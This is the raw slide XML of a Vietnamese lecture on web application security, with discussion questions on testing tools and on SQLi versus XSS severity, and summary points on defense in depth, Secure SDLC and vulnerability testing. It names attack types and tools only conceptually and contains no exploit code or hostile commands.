                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Câu hỏi: Tại sao đây là lựa chọn hợp lý?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="vi-VN" dirty="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Mục tiêu thảo luận:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Biết cách ưu tiên chọn công cụ phù hợp khi hạn chế tài nguyên.</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Gợi ý trả lời:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Burp Suite + ZAP vừa hỗ trợ quét tự động (ZAP) vừa kiểm thử thủ công chuyên sâu (Burp) để cân bằng chi phí &amp; hiệu quả. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="402757711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87332"/>
            <a:ext cx="10242645" cy="460611"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>3.2.8.</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3"/>
            <a:ext cx="10106168"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5</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>. SQLi vs XSS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Tình huống: Website có SQLi (rò rỉ thẻ tín dụng) và XSS (đánh cắp cookie).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Câu hỏi: Lỗi nào gây hậu quả nghiêm trọng hơn cho doanh nghiệp?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"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Mục tiêu thảo luận:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Phân tích mức độ thiệt hại kinh doanh và uy tín từ từng loại lỗ hổng.</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Gợi ý trả lời:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>SQLi nghiêm trọng hơn vì rò rỉ dữ liệu nhạy cảm (thẻ tín dụng, email), gây thiệt hại tài chính, pháp lý lớn hơn XSS.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="93506307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24084" y="809683"/>
            <a:ext cx="10222173"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1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>. Bảo mật ứng dụng Web đòi hỏi kiến trúc phòng thủ nhiều lớp (Defense in Depth), kết hợp nhiều công nghệ: WAF, IDS/IPS, firewall, mã hóa, giám sát.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>2. Các kỹ thuật tấn công ngày càng nâng cao và tinh vi (Blind SQLi, DOM XSS, RFI, LFI, tấn công API), vượt ngoài phạm vi của các lỗ hổng cơ bản.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>3. Biện pháp bảo vệ nâng cao cần chú trọng:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200" algn="l">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>CSP, Secure Cookie, OAuth2.0, JWT.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200" algn="l">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>WAF thế hệ mới ứng dụng AI/ML để phát hiện hành vi bất thường.</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739420" y="3874822"/>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24084" y="809683"/>
            <a:ext cx="10222173"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4</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>. Công cụ kiểm thử (OWASP ZAP, Burp Suite, sqlmap, Nikto) và kỹ thuật SAST/DAST giúp phát hiện sớm lỗ hổng.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>5. Quản lý vòng đời bảo mật theo Secure SDLC / DevSecOps là xu thế bắt buộc để đưa bảo mật vào ngay từ giai đoạn phát triển.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>6. Các lỗ hổng phổ biến như SQLi, XSS cần có cách phòng ngừa chuyên biệt và thực hành thường xuyên.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>7. Kiểm tra bảo mật phải đi theo quy trình: lập kế hoạch → quét tự động → kiểm thử thủ công → báo cáo khắc phục.</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739420" y="3874822"/>
            <a:ext cx="1156703" cy="1156703"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2657931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24084" y="809683"/>
            <a:ext cx="8965007" cy="4372169"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Lưu </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>ý: </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FFC000"/>
              </a:solidFill>
              <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              <a:ea typeface="+mj-ea"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Bảo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>mật ứng dụng Web không phải là một giải pháp một lần, mà là quy trình liên </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>tục</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>kết hợp công nghệ, con người và quy trình quản lý để giảm thiểu rủi ro trong suốt vòng đời hệ thống.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FFC000"/>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739420" y="3874822"/>
            <a:ext cx="1156703" cy="1156703"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="25823683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4BA817-A03C-4EA3-86C4-6E42BD37F523}">
  <ds:schemaRefs>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/sharepoint/v3/contenttype/forms"/>
  </ds:schemaRefs>
</ds:datastoreItem>
</file>

<file path=customXml/itemProps2.xml><?xml version="1.0" encoding="utf-8"?>
<ds:datastoreItem xmlns:ds="http://schemas.openxmlformats.org/officeDocument/2006/customXml" ds:itemID="{D0096A91-93C8-4C7A-BF68-944591874A6D}">
  <ds:schemaRefs>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71af3243-3dd4-4a8d-8c0d-dd76da1f02a5"/>
    <ds:schemaRef ds:uri="16c05727-aa75-4e4a-9b5f-8a80a1165891"/>
    <ds:schemaRef ds:uri="http://purl.org/dc/terms/"/>
    <ds:schemaRef ds:uri="http://purl.org/dc/dcmitype/"/>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5975</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>465</Paragraphs>
  <Slides>59</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59</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="69" baseType="lpstr">
      <vt:lpstr>Arial</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3.2: BẢO MẬT ỨNG DỤNG WEB (PHẦN 2)</vt:lpstr>
      <vt:lpstr>3.2.1. Kiến trúc bảo mật ứng dụng Web </vt:lpstr>
      <vt:lpstr>3.2.1. Kiến trúc bảo mật ứng dụng Web </vt:lpstr>
      <vt:lpstr>3.2.1. Kiến trúc bảo mật ứng dụng Web </vt:lpstr>
      <vt:lpstr>3.2.2. Các kỹ thuật tấn công ứng dụng Web nâng cao </vt:lpstr>
      <vt:lpstr>3.2.2. Các kỹ thuật tấn công ứng dụng Web nâng cao </vt:lpstr>
      <vt:lpstr>3.2.2. Các kỹ thuật tấn công ứng dụng Web nâng cao </vt:lpstr>
      <vt:lpstr>3.2.2. Các kỹ thuật tấn công ứng dụng Web nâng cao </vt:lpstr>
      <vt:lpstr>3.2.2. Các kỹ thuật tấn công ứng dụng Web nâng cao </vt:lpstr>
      <vt:lpstr>3.2.3. Các biện pháp bảo vệ ứng dụng Web nâng cao</vt:lpstr>
      <vt:lpstr>3.2.3. Các biện pháp bảo vệ ứng dụng Web nâng cao</vt:lpstr>
      <vt:lpstr>3.2.3. Các biện pháp bảo vệ ứng dụng Web nâng cao</vt:lpstr>
      <vt:lpstr>3.2.3. Các biện pháp bảo vệ ứng dụng Web nâng cao</vt:lpstr>
      <vt:lpstr>3.2.4. Công cụ kiểm thử và phát hiện lỗ hổng ứ/dụng Web</vt:lpstr>
      <vt:lpstr>3.2.4. Công cụ kiểm thử và phát hiện lỗ hổng ứ/dụng Web</vt:lpstr>
      <vt:lpstr>3.2.4. Công cụ kiểm thử và phát hiện lỗ hổng ứ/dụng Web</vt:lpstr>
      <vt:lpstr>3.2.4. Công cụ kiểm thử và phát hiện lỗ hổng ứ/dụng Web</vt:lpstr>
      <vt:lpstr>3.2.4. Công cụ kiểm thử và phát hiện lỗ hổng ứ/dụng Web</vt:lpstr>
      <vt:lpstr>3.2.4. Công cụ kiểm thử và phát hiện lỗ hổng ứ/dụng Web</vt:lpstr>
      <vt:lpstr>3.2.4. Công cụ kiểm thử và phát hiện lỗ hổng ứ/dụng Web</vt:lpstr>
      <vt:lpstr>3.2.4. Công cụ kiểm thử và phát hiện lỗ hổng ứ/dụng Web</vt:lpstr>
      <vt:lpstr>3.2.5. Quản lý vòng đời bảo mật ứng dụng Web</vt:lpstr>
      <vt:lpstr>3.2.5. Quản lý vòng đời bảo mật ứng dụng Web</vt:lpstr>
      <vt:lpstr>3.2.5. Quản lý vòng đời bảo mật ứng dụng Web</vt:lpstr>
      <vt:lpstr>3.2.5. Quản lý vòng đời bảo mật ứng dụng Web</vt:lpstr>
      <vt:lpstr>3.2.5. Quản lý vòng đời bảo mật ứng dụng Web</vt:lpstr>
      <vt:lpstr>3.2.5. Quản lý vòng đời bảo mật ứng dụng Web</vt:lpstr>
      <vt:lpstr>3.2.6. Ngăn ngừa lỗ hổng SQLi và XSS  </vt:lpstr>
      <vt:lpstr>3.2.6. Ngăn ngừa lỗ hổng SQLi và XSS  </vt:lpstr>
      <vt:lpstr>3.2.6. Ngăn ngừa lỗ hổng SQLi và XSS  </vt:lpstr>
      <vt:lpstr>3.2.6. Ngăn ngừa lỗ hổng SQLi và XSS  </vt:lpstr>
      <vt:lpstr>3.2.6. Ngăn ngừa lỗ hổng SQLi và XSS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3.2.7. Quy trình kiểm tra bảo mật ứng dụng Web </vt:lpstr>
      <vt:lpstr>3.2.8. Thảo luận</vt:lpstr>
      <vt:lpstr>3.2.8. Thảo luận</vt:lpstr>
      <vt:lpstr>3.2.8. Thảo luận</vt:lpstr>
      <vt:lpstr>3.2.8. Thảo luận</vt:lpstr>
      <vt:lpstr>3.2.8. Thảo luận</vt:lpstr>
      <vt:lpstr>3.2.8. Thảo luận</vt:lpstr>
      <vt:lpstr>3.2.8. Thảo luận</vt:lpstr>
      <vt:lpstr>3.2.8. Thảo luận</vt:lpstr>
      <vt:lpstr>3.2.8. Thảo luận</vt:lpstr>
      <vt:lpstr>3.2.8. Thảo luận</vt:lpstr>
      <vt:lpstr>3.2.8. Thảo luận</vt:lpstr>
      <vt:lpstr>Những nội dung cần lưu ý:</vt:lpstr>
      <vt:lpstr>Những nội dung cần lưu ý:</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2025-09-04T02:24:32Z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